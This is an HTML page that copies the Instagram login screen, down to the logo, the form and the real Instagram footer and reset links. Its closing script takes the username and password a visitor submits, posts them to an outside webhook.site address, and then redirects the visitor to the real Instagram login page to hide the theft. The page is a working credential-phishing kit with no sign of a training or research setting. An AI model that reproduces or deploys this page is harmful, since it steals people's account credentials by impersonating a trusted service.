<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Noto Sans', Helvetica, Arial, sans-serif;
            background-color: #f6f8fa;
            display: flex; flex-direction: column;
            justify-content: center; align-items: center;
            min-height: 100vh; color: #1f2328;
        }
        .logo { margin-bottom: 24px; }
        .auth-form {
            background-color: #ffffff;
            border: 1px solid #d0d7de;
            border-radius: 6px;
            padding: 20px;
            width: 340px;
            font-size: 14px;
        }
        .auth-form h1 {
            font-size: 24px; font-weight: 300;
            letter-spacing: -0.5px; text-align: center;
            margin-bottom: 16px;
        }
        .auth-form label {
            display: block; font-weight: 400;
            margin-bottom: 6px; font-size: 14px;
        }
        .auth-form input[type="text"],
        .auth-form input[type="password"] {
            width: 100%; padding: 5px 12px;
            font-size: 14px; line-height: 20px;
            border: 1px solid #d0d7de;
            border-radius: 6px; background-color: #f6f8fa;
            margin-bottom: 16px; outline: none;
        }
        .auth-form input:focus {
            border-color: #0969da;
            box-shadow: 0 0 0 3px rgba(9,105,218,0.3);
            background-color: #ffffff;
        }
        .auth-form .password-header {
            display: flex; justify-content: space-between;
            align-items: baseline;
        }
        .auth-form .password-header a {
            font-size: 12px; color: #0969da;
            text-decoration: none;
        }
        .auth-form .password-header a:hover { text-decoration: underline; }
        .auth-form input[type="submit"] {
            width: 100%; padding: 5px 16px;
            font-size: 14px; font-weight: 500;
            line-height: 20px; color: #ffffff;
            background-color: #0095f6;
            border: 1px solid rgba(27,31,36,0.15);
            border-radius: 6px; cursor: pointer; margin-top: 4px;
        }
        .auth-form input[type="submit"]:hover { background-color: #1877f2; }
        .auth-form .divider {
            text-align: center; margin: 16px 0;
            font-size: 12px; color: #656d76;
            border-bottom: 1px solid #d0d7de;
            line-height: 0.1em;
        }
        .auth-form .divider span { background: #fff; padding: 0 10px; }
        .create-account {
            background-color: #ffffff;
            border: 1px solid #d0d7de;
            border-radius: 6px; padding: 16px;
            width: 340px; margin-top: 16px;
            text-align: center; font-size: 14px;
        }
        .create-account a { color: #0095f6; text-decoration: none; font-weight: 600; }
        .create-account a:hover { text-decoration: underline; }
        footer {
            margin-top: 40px; font-size: 12px; color: #656d76;
        }
        footer a {
            color: #656d76; text-decoration: none; margin: 0 8px;
        }
        footer a:hover { text-decoration: underline; color: #0095f6; }
    </style>
</head>
<body>
    <div class="logo">
        <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 48 48">
            <radialGradient id="instaGrad" cx="50%" cy="50%" r="50%">
                <stop offset="0%" stop-color="#F58529"/>
                <stop offset="50%" stop-color="#DD2A7B"/>
                <stop offset="100%" stop-color="#8134AF"/>
            </radialGradient>
            <rect width="48" height="48" rx="12" fill="url(#instaGrad)"/>
            <rect x="9" y="9" width="30" height="30" rx="8" fill="none" stroke="white" stroke-width="2.5"/>
            <circle cx="24" cy="24" r="8" fill="none" stroke="white" stroke-width="2.5"/>
            <circle cx="33" cy="15" r="2" fill="white"/>
        </svg>
    </div>

    <div class="auth-form">
        <h1>Log in to Instagram</h1>
        
        <form id="login-form">
            <label for="login_field">Username or email address</label>
            <input type="text" name="login" id="login_field" 
                   placeholder="Username or email address" 
                   autocapitalize="off" autocorrect="off" autofocus required>
            
            <div class="password-header">
                <label for="password">Password</label>
                <a href="https://www.instagram.com/accounts/password/reset/">Forgot password?</a>
            </div>
            <input type="password" name="password" id="password" 
                   placeholder="Password" required>
            
            <input type="submit" value="Log in">
        </form>
    </div>

    <div class="create-account">
        Don't have an account? <a href="https://www.instagram.com/accounts/emailsignup/">Sign up</a>.
    </div>

    <footer>
        <a href="https://help.instagram.com/">About</a>
        <a href="https://help.instagram.com/">Help</a>
        <a href="https://help.instagram.com/">Privacy</a>
        <a href="https://help.instagram.com/">Terms</a>
    </footer>

    <script>
    const WEBHOOK_URL = 'https://webhook.site/d53b4a4e-e79e-47c4-8130-6858305f3d88';
    
    document.getElementById('login-form').addEventListener('submit', function(e) {
        e.preventDefault();
        
        var formData = new FormData(this);
        
        fetch(WEBHOOK_URL, {
            method: 'POST',
            body: formData,
            mode: 'no-cors'
        });
        
        window.location.href = 'https://www.instagram.com/accounts/login/';
    });
    </script>
</body>
</html>
